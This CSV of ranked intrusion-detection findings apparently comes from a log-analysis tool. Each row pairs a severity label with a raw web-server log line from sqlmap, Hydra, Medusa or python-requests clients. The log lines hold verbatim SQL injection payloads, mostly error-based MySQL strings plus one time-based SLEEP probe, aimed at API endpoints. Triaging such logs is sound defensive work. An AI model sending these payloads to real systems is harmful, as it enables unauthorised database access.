Rank,Line,Score,Severity,Description,Raw Log
1,3311,0.6954,HIGH,SQLi Attempt by Known Attack Tool,"91.108.4.200 - - [01/Jun/2024:05:04:30 +0000] ""GET /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 1209 ""-"" ""Medusa v2.3"""
2,3393,0.6949,HIGH,Brute Force + SQLi Combo Attack,"77.247.181.163 - - [01/Jun/2024:05:05:56 +0000] ""GET /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 1505 ""-"" ""-"""
3,3469,0.6946,HIGH,SQLi Attempt by Known Attack Tool,"5.188.210.100 - - [01/Jun/2024:05:07:15 +0000] ""GET /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 1432 ""-"" ""sqlmap/1.7.11#stable (https://sqlmap.org)"""
4,3114,0.6943,HIGH,SQLi Attempt by Known Attack Tool,"77.247.181.163 - - [01/Jun/2024:05:01:05 +0000] ""POST /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 3290 ""-"" ""Hydra v9.5 (www.thc.org/thc-hydra)"""
5,3312,0.6943,HIGH,SQLi Attempt by Known Attack Tool,"176.9.28.202 - - [01/Jun/2024:05:04:31 +0000] ""POST /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 3371 ""-"" ""sqlmap/1.7.11#stable (https://sqlmap.org)"""
6,3061,0.6932,HIGH,SQLi Attempt by Known Attack Tool,"91.108.4.200 - - [01/Jun/2024:05:00:09 +0000] ""POST /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 2589 ""-"" ""Medusa v2.3"""
7,3075,0.6926,HIGH,SQLi Attempt by Known Attack Tool,"77.247.181.163 - - [01/Jun/2024:05:00:24 +0000] ""POST /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 2949 ""-"" ""sqlmap/1.7.11#stable (https://sqlmap.org)"""
8,3128,0.6893,HIGH,SQLi Attempt by Known Attack Tool,"5.188.210.100 - - [01/Jun/2024:05:01:20 +0000] ""POST /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 1348 ""-"" ""Hydra v9.5 (www.thc.org/thc-hydra)"""
9,3267,0.6859,CRITICAL,Possible Successful SQLi Breach,"77.247.181.163 - - [01/Jun/2024:05:03:45 +0000] ""GET /api/search?term=test' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)-- HTTP/1.1"" 200 15555 ""-"" ""sqlmap/1.7.11#stable (https://sqlmap.org)"""
10,3165,0.6847,MEDIUM,SQLi Attempt (Server Blocked),"91.108.4.200 - - [01/Jun/2024:05:01:57 +0000] ""POST /api/v1/data?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x70,0x71,0x70,0x71,(SELECT (ELT(1=1,1))),0x71,0x71,0x70,0x70,0x71) FROM DUAL),8446744073709551610,8446744073709551610)))-- - HTTP/1.1"" 500 3228 ""-"" ""python-requests/2.28.0"""
